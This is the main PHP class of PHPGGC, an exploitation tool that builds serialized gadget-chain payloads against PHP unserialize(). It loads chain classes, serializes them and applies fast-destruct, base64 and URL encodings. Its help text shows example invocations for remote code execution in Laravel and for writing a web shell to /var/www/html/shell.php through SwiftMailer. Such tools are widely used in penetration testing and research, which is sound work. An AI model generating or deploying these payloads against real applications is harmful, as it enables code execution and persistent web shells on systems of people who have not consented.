<?php
# PHPGGC: PHP Generic Gadget Chains
# Library of generic exploitation vectors for unserialize()
#

class PHPGGC
{
    const DIR_GADGETCHAINS = '/gadgetchains';
    const DIR_TEMPLATES = '/templates';
    const DIR_BASE_GADGETCHAINS = '/lib/PHPGGC/GadgetChain';
    const DIR_LIB = '/lib';

    protected $has_wrapper = False;
    protected $chains;

    public function __construct()
    {
        $this->base = realpath(dirname(dirname(__FILE__)));
        spl_autoload_register(array($this, 'autoload'));
        $this->chains = $this->get_gadget_chains();
    }

    /**
     * Generates a payload from the command line arguments.
     * First, the gadget is loaded, and then it is generated using additional
     * arguments.
     */
    public function generate()
    {
        global $argv;

        $parameters = $this->parse_cmdline($argv);

        if($parameters === null)
        {
            return;
        }

        if(count($parameters) < 1)
        {
            $this->help();
            return;
        }

        $class = array_shift($parameters);
        $gc = $this->get_gadget_chain($class);

        $parameters = $this->get_type_parameters($gc, $parameters);
        $generated = $this->serialize($gc, $parameters);
        print($generated . "\n");
    }

    /**
     * Gets an instance of the given GadgetChain class.
     */
    public function get_gadget_chain($class)
    {
        $full = strtolower('GadgetChain/' . $class);

        if(!in_array($full, array_keys($this->chains)))
        {
            throw new PHPGGC\Exception('Unknown gadget chain: ' . $class);
        }

        return $this->chains[$full];
    }

    /**
     * Generates the serialized payload from given gadget and parameters.
     */
    public function serialize($gc, $parameters)
    {
        $gc->load_gadgets();

        $parameters = $gc->pre_process($parameters);
        $payload = $gc->generate($parameters);
        $payload = $this->wrap($payload);

        $serialized = serialize($payload);

        $serialized = $gc->post_process($serialized);
        $serialized = $this->apply_filters($serialized);

        return $serialized;
    }

    /**
     * Includes every file that might contain a gadget.
     */
    protected function include_gadget_chains()
    {
        $base = $this->base . self::DIR_GADGETCHAINS;
        $files = glob($base . '/*/*/*/chain.php');
        array_map(function ($file) {
            include_once $file;
        }, $files);
    }

    /**
     * Loads every available gadget and returns an array of the form
     * class_name => object.
     */
    public function get_gadget_chains()
    {
        $this->include_gadget_chains();

        $classes = get_declared_classes();
        $classes = array_filter($classes, function($class) {
            return is_subclass_of($class, '\\PHPGGC\\GadgetChain') &&
                   strpos($class, 'GadgetChain\\') === 0;
        });
        $objects = array_map(function($class) {
            return new $class();
        }, $classes);

        # Convert backslashes in classes names to forward slashes,
        # so that the command line is easier to use
        $classes = array_map(function($class) {
            return strtolower(str_replace('\\', '/', $class));
        }, $classes);
        return array_combine($classes, $objects);
    }

    /**
     * Includes a PHP file containing a wrapper($data) function.
     * This method will be called after the gadget chain has been generated,
     * and before serialize() is called, in order to modify the payload if
     * need be.
     */
    public function set_wrapper($file)
    {
        include $file;
        $this->_has_wrapper = true;
    }

    /**
     * Wraps the payload into something else if the user required it.
     * For instance, if a specific unserialize call requires an array, one could
     * build a wrapper function of the likes:
     *
     * function wrapper($description)
     * {
     *     return array('id' => '123', 'data' => $description['payload']);
     * }
     *
     * The returned serialized payload would be an array which contains the
     * payload under the key "data".
     */
    public function wrap($payload)
    {
        if(isset($this->_has_wrapper))
        {
            $payload = call_user_func('wrapper', $payload);
        }

        return $payload;
    }

    /**
     * Autoloads PHPGGC base classes only, in order to avoid conflict between
     * different gadget chains.
     */
    public function autoload($class)
    {
        if(strpos($class, 'PHPGGC\\') === 0)
        {
            $file = str_replace('\\', '/', $class) . '.php';
            include_once $this->base . self::DIR_LIB . '/' . $file;
        }
    }

    /**
     * Creates the file structure for a new gadget chain targeting $name and of
     * type $type.
     */
    function new_gc($name, $type)
    {
        $namespace = '\\PHPGGC\\GadgetChain';
        
        # Check type

        $type = strtoupper($type);
        $reflection = new ReflectionClass($namespace);
        $constant = 'TYPE_' . $type;
        $value = $reflection->getConstant($constant);

        if($value === false)
        {
            $this->o('Invalid type: ' . $type);
            return;
        }

        # Match base class from type

        $base = $this->base . self::DIR_BASE_GADGETCHAINS;
        $files = glob($base . '/*.php');

        foreach($files as $file)
        {
            $classname = substr(basename($file), 0, -4);
            $classname = $namespace . '\\' . $classname;
            $reflection = new ReflectionClass($classname);

            if($reflection->getProperty('type')->getValue() === $value)
            {
                $baseclass = $reflection;
                break;
            }
        }
        
        if(!isset($baseclass))
        {
            $this->o('No base class for type: ' . $type);
            return;
        }

        # Create directory structure

        $base = $this->base . self::DIR_GADGETCHAINS;
        $base = $base . '/' . $name . '/' . $type . '/';

        for($i=1;file_exists($base . $i);$i++);

        $base = $base . $i;
        mkdir($base, 0777, true);

        $replacements = [
            '{NAME}' => $name,
            '{CLASS_NAME}' => $type . $i,
            '{BASE_CLASS_NAME}' => $baseclass->getName()
        ];

        $this->create_from_template($base, 'chain.php', $replacements);
        $this->create_from_template($base, 'gadgets.php');

        # Display success message

        $full_name = $replacements['{NAME}'] . '\\'
                   . $replacements['{CLASS_NAME}'];
        $base = substr($base, strlen($this->base) + 1);

        $this->o('Created ' . $full_name . ' under: ' . $base);
    }

    /**
     * Creates a file in directory $path from template $name.
     */
    function create_from_template($path, $name, $replacements=null)
    {
        $template = $this->base . self::DIR_TEMPLATES . '/' . $name;
        $template = file_get_contents($template);

        if($replacements)
            $template = strtr($template, $replacements);

        file_put_contents($path . '/' . $name, $template);
    }

    #
    # Display
    #

    /**
     * Displays a message.
     */
    function output($message, $r=1)
    {
        $n = str_repeat("\n", $r);
        print($message . $n);
    }

    /**
     * Wrapper for output().
     */
    protected function o($message, $r=1)
    {
        $this->output($message, $r);
    }

    /**
     * Applies the fast-destruct technique, so that the object is destroyed
     * right after the unserialize() call, as opposed to at the end of the
     * script.
     *
     * This is very useful because sometimes the script throws an exception
     * after unserializing the object, and therefore __destruct() will never be
     * called.
     *
     * The object is put in a 2-item array. Both items have the same key.
     * Since the object has been put first, it is removed when the second item
     * is processed (same key). It will therefore be destroyed, and as a result
     * __destruct() will be called right after the unserialize() call, instead
     * of at the end of the script.
     */
    protected function apply_fast_destruct($serialized)
    {
        $key = 7;
        return sprintf('a:2:{i:%s;%s;i:%s;i:0}', $key, $serialized, $key);
    }

    /**
     * Applies command line filters on the serialized payload.
     */
    protected function apply_filters($serialized)
    {
        foreach($this->options as $v)
        {
            switch($v)
            {
                case 'fast-destruct':
                    $serialized = $this->apply_fast_destruct($serialized);
                    break;
                case 'base64':
                    $serialized = base64_encode($serialized);
                    break;
                case 'url':
                    $serialized = urlencode($serialized);
                    break;
                case 'soft':
                    $keys = str_split("%\x00\n\r\t+");
                    $values = array_map('urlencode', $keys);
                    $serialized = str_replace($keys, $values, $serialized);
                    break;
            }
        }

        return $serialized;
    }

    /**
     * Generates an ASCII array.
     */
    protected function table($titles, $data)
    {
        $titles = array_map('strtoupper', $titles);
        $data = array_merge([$titles], $data);
        $pad = array_fill(0, count($titles), 0);
        
        foreach($data as $row)
        {
            foreach($row as $i => $cell)
            {
                $pad[$i] = max($pad[$i], strlen($cell));
            }
        }

        $array = '';

        foreach($data as $row)
        {
            foreach($row as $i => $cell)
            {
                $array .= str_pad($cell, $pad[$i]) . '    ';
            }
            $array .= "\n";
        }

        return $array;
    }

    protected function list_gc()
    {
        $this->o("");
        $this->o("Gadget Chains");
        $this->o("-------------", 2);

        $titles = [
            'Name',
            'Version',
            'Type',
            'Vector',
            'I'
        ];

        $data = [];
        foreach($this->chains as $chain)
        {
            $data[] = [
                $chain->get_name(),
                $chain->version,
                $chain::$type,
                $chain->vector,
                ($chain->informations ? '*' : '')
            ];
        }

        $this->o($this->table($titles, $data));

        exit(0);
    }

    protected function help()
    {
        $this->o("");
        $this->o("PHPGGC: PHP Generic Gadget Chains");
        $this->o("---------------------------------", 2);

        $this->o("USAGE");
        $this->o("  " . $this->_get_command_line(
            '[-h|-l|-w|-h|-d|-s|-u|-b|-i]',
            '<GadgetChain>',
            '[arguments]'
        ), 2);

        $this->o("INFORMATION");
        $this->o("  -h, --help Displays help");
        $this->o("  -l, --list Lists available gadget chains");
        $this->o("  -i, --info Displays informations about a gadget chain");
        $this->o("");
        $this->o("MODIFICATION");
        $this->o("  -w, --wrapper <wrapper>");
        $this->o("     Specifies a file containing a function: wrapper(\$payload)");
        $this->o("     This function will be called before the generated gadget is serialized.");
        $this->o("");
        $this->o("ENHANCEMENTS");
        $this->o("  -f, --fast-destruct");
        $this->o("     Applies the fast-destruct technique, so that the object");
        $this->o("     is destroyed right after the unserialize() call, as opposed to at the");
        $this->o("     end of the script");
        $this->o("");
        $this->o("ENCODING");
        $this->o("  -s, --soft   Soft URLencode");
        $this->o("  -u, --url    URLencodes the payload");
        $this->o("  -b, --base64 Converts the output into base64");
        $this->o("");

        $this->o("EXAMPLES");
        $this->o("  " . $this->_get_command_line(
            'Laravel/RCE1',
            '\'phpinfo().die();\''
        ));
        $this->o("  " . $this->_get_command_line(
            'SwiftMailer/FW1',
            '/var/www/html/shell.php',
            '/path/to/local/shell.php'
        ));
        $this->o("");

        exit(0);
    }

    function _parse_cmdline_arg($i, &$argv, &$parameters, &$options)
    {
        $count = count($argv);

        $valid_arguments = [
            'new' => true,
            'informations' => true,
            'help' => false,
            'list' => false,
            'wrapper' => true,
            'fast-destruct' => false,
            'soft' => false,
            'base64' => false,
            'url' => false,
        ];

        $arg = $argv[$i];
        $arg = substr($arg, 1);
        $valid = false;

        foreach($valid_arguments as $argument => $has_parameter)
        {
            # Check for short and long arguments (-a, --argument)
            if(
                $argument{0} == $arg ||
                $arg{0} == '-' && substr($arg, 1) == $argument
            )
            {
                $valid = true;

                if($has_parameter)
                {
                    if($count < $i + 1)
                    {
                        $e = 'Parameter "' . $argument . '" expects a value';
                        throw new \PHPGGC\Exception($e);
                    }

                    $parameters[$argument] = $argv[$i+1];
                    
                    # Delete argument's value
                    unset($argv[$i+1]);
                }
                else
                {
                    $options[] = $argument;
                }

                # Delete argument
                unset($argv[$i]);

                break;
            }
        }
        
        if(!$valid)
        {
            throw new PHPGGC\Exception('Unknown parameter: ' . $arg);
        }
    }

    /**
     * Parses the command line arguments.
     */
    protected function parse_cmdline($argv)
    {
        unset($argv[0]);

        # Parameters expect a value, options don't
        $parameters = [];
        $options = [];

        foreach($argv as $i => $arg)
        {
            if($arg == '--')
            {
                unset($argv[$i]);
                break;
            }
            if(strlen($arg) >= 2 && $arg{0} == '-')
            {
                $this->_parse_cmdline_arg($i, $argv, $parameters, $options);
            }
        }

        $argv = array_values($argv);

        # Handle options and parameters in case they need to be handled now.

        foreach($options as $option)
        {
            switch($option)
            {
                case 'list':
                    $this->list_gc();
                    return;
                case 'help':
                    $this->help();
                    return;
            }
        }

        foreach($parameters as $key => $value)
        {
            switch($key)
            {
                case 'informations':
                    $gc = $this->get_gadget_chain($value);
                    $this->o($gc, 2);
                    $this->o($this->_get_command_line_gc($gc));
                    return;
                case 'new':
                    if(count($argv) < 1)
                    {
                        $line = $this->_get_command_line('<Framework> <type>');
                        $this->o($line);
                    }
                    else
                        $this->new_gc($value, $argv[0]);
                    return;
                case 'wrapper':
                    $this->set_wrapper($value);
                    break;
            }
        }

        # Otherwise, store them and return the rest of the command line

        $this->parameters = $parameters;
        $this->options = $options;

        # Return remaining arguments
        return array_values($argv);
    }

    /**
     * Convert command line parameters into an array of named parameters,
     * specific to the type of payload.
     */
    protected function get_type_parameters($gc, $parameters)
    {
        $arguments = $gc->parameters;

        $values = @array_combine($arguments, $parameters);

        if($values === false)
        {
            $this->o($gc, 2);
            $message = 'Invalid arguments for type "' . $gc::$type . '" ' . "\n"
                     . $this->_get_command_line_gc($gc);
            throw new PHPGGC\Exception($message);
        }

        return $values;
    }

    protected function _get_command_line_gc($gc)
    {
        $arguments = array_map(function ($a) {
                return '<' . $a . '>';
        }, $gc->parameters);
        return $this->_get_command_line($gc->get_name(), ...$arguments);
    }

    private function _get_command_line(...$arguments)
    {
        return './phpggc ' . implode(' ', $arguments);
    }
}